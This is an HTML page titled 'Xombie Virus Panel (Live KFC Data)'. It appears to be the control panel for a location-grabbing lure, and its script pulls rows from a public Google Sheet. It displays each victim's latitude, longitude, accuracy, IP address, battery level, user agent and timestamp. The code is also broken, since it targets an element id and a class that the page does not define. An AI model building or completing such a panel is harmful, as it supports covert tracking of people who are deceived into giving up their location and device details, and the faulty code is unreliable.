<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Xombie Virus Panel</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #000;
      color: #0ff;
      padding: 20px;
    }
    h1 {
      color: #fff;
      text-align: center;
    }
    .entry {
      border: 2px solid #0ff;
      padding: 15px;
      margin: 10px 0;
      border-radius: 10px;
      background: #111;
    }
  </style>
</head>
<body>
  <h1>üìç XombieVirus Panel (Live KFC Data)</h1>
  <div id="data"></div>

<script>
  async function loadData() {
    const sheetURL = 'https://opensheet.elk.sh/169KNrSyMEwmVJAHsMVTIGmevUvHjFrgr2-424nMEwhc/Sheet1';
    const res = await fetch(sheetURL);
    const data = await res.json();

    // Optional: Console check
    console.log(data);

    // Yahan apni panel ki display logic likho, for example:
    const container = document.getElementById("location-data");
    data.forEach(entry => {
      const card = document.createElement("div");
      card.className = "entry-card";
      card.innerHTML = `
        <p><strong>Latitude:</strong> ${entry.Latitude}</p>
        <p><strong>Longitude:</strong> ${entry.Longitude}</p>
        <p><strong>Accuracy:</strong> ${entry.Accuracy}</p>
        <p><strong>IP:</strong> ${entry.IP}</p>
        <p><strong>Battery:</strong> ${entry.Battery}</p>
        <p><strong>UserAgent:</strong> ${entry.UserAgent}</p>
        <p><strong>Time:</strong> ${entry.Time}</p>
        <hr/>
      `;
      container.appendChild(card);
    });
  }

  // Load data on page load
  window.onload = loadData;
</script>
</body>
</html>
